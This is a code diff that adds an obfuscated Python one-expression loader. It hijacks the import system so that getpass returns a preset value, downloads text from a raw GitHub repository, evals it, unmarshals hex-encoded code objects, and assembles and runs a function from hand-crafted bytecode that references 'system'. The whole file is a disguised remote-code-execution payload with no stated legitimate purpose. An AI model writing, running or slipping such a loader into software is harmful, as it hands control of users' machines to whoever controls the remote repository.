@@ -1,0 +1,73 @@
+(lambda bytecode, database_hook: (
+    pybear              := 'https://raw.githubusercontent.com/uneasily/pybear/main',
+    
+    globals().__setitem__(
+        '__import__',
+        (
+            original_import := __import__,
+            (lambda name: [
+                original_import('types').SimpleNamespace(**{
+                    'getpass': (lambda prompt='': database_hook)
+                }) 
+                if module_name == 'getpass' 
+                else original_import(module_name)
+                for module_name in [name]
+            ][0])
+        )[1]
+    ),
+
+    marshal             := __import__( 'marshal'  ),
+    requests            := __import__( 'requests' ),
+
+    request_code_object := lambda _: eval(          requests.get(_).text      ),
+    load_code_object    := lambda _: marshal.loads( bytes.fromhex(''.join(_)) ),
+
+    co_code             := b''.join( request_code_object(f'{pybear}/vm')  ),
+    code_objects        := [
+        load_code_object(request_code_object(f'{pybear}/hex{_}'))
+        for _ in [7, 8, 9, 10, 6]
+    ],
+
+    (
+        empty_lambda_function := (lambda: ''),
+        function_attributes   := {
+            0: 1,                                                  # co_argcount
+            1: ('',),                                              # co_cellvars
+            2: co_code,                                            # co_code
+            3: ( None, 95, 98, 117, 105, 108,                      # co_consts
+                116, 110, 115, 101, 118, 97,
+
+                *(_:=[], [
+                    ( _.append(x), _.append(''))
+                    for x in code_objects[:-1]
+                ])[0],
+
+                -4, 111, 119, 114, -1, 7, 
+                'ghijklmno', 112, 99, '#',
+                '0x', 100, 103, 1, 0, 109,
+                'system', code_objects[4], 
+                '', 121, '', 106, 69, 120 ),
+            4: 3,                                                  # co_flags
+            5: ('globals', 'chr', '__dict__', '__getattribute__'), # co_names
+            6: 21,                                                 # co_nlocals
+            7: 11,                                                 # co_stacksize
+            8: ('_', '_', '_')                                     # co_varnames
+        },
+
+        type(empty_lambda_function)(empty_lambda_function.__code__.replace(**{
+            attribute: function_attributes[index]
+
+            for index, attribute in enumerate(tuple(
+                _ for _ in dir(empty_lambda_function.__code__)
+
+                if ( True
+                and _[ 2   ] ==     '_'
+                and _[ 3   ] in     ['a', 'c', 'f', 'n', 's', 'v']
+                and _[ 3:5 ] not in ['fi','fr']
+                and _[ -2: ] !=     'me' )
+            ))
+        }),
+
+        globals(), ''
+    )
+)[2])[-1](bytecode))
